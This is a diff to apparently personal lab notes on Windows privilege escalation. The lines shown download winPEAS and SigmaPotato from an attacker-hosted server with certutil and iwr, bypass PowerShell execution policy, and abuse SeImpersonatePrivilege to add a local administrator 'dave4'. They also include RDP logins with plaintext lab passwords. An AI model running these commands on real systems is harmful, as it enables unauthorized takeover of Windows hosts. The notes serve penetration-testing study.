@@ -93,7 +93,7 @@ locate winpeas
 /usr/share/peass/winpeas/winPEASx86_ofs.exe
 
 python3 -m http.server 80
-certutil.exe -urlcache -split -f http://192.168.45.241/winPEASx64.exe winPEASx64.exe
+certutil.exe -urlcache -split -f http://192.168.45.168/winPEASx64.exe winPEASx64.exe
 .\winPEASx64.exe
 
 
@@ -382,3 +382,58 @@ xfreerdp /v:192.168.160.220 /u:dave2 /p:'password123!' /cert-ignore /dynamic-res
 
 ```
 
+ [[ExploitWinPriv]]
+```powershell
+whoami /priv 
+# ตรวจสอบ version ของ OS และนำไปหาช่องโหว่จากข้อมูลที่ได้ 
+systeminfo
+```
+
+![[winexploit-0.png]]
+
+![[Winexploit-1.png]]
+
+![[winexploit-2.png]]
+
+---
+
+[[SeImpersonatePrivilege=SigmaPotato]]
+
+```powershell
+# Try whoami /priv 
+powershell -ep bypass 
+
+C:\Users\dave> whoami /priv
+whoami /priv
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeSecurityPrivilege           Manage auditing and security log          Disabled
+SeShutdownPrivilege           Shut down the system                      Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeUndockPrivilege             Remove computer from docking station      Disabled
+SeImpersonatePrivilege***     Impersonate a client after authentication Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+SeTimeZonePrivilege           Change the time zone                      Disabled
+
+
+wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe
+
+iwr -uri http://192.168.45.168/SigmaPotato.exe -OutFile SigmaPotato.exe
+
+# ตัวอย่างจะทำการสร้าง user: dave4 และมีรหัสผ่าน lab ไปที่ Administrators 
+.\SigmaPotato "net user dave4 lab /add"
+.\SigmaPotato "net localgroup Administrators dave4 /add"
+
+xfreerdp /v:192.168.160.220 /u:dave4 /p:'lab' /cert-ignore /dynamic-resolution +clipboard /drive:TEST,/home/kali/
+
+
+iwr -uri http://192.168.45.168/SigmaPotato.exe -OutFile SigmaPotato.exe
+
+```
+
+https://jlajara.gitlab.io/Potatoes_Windows_Privesc
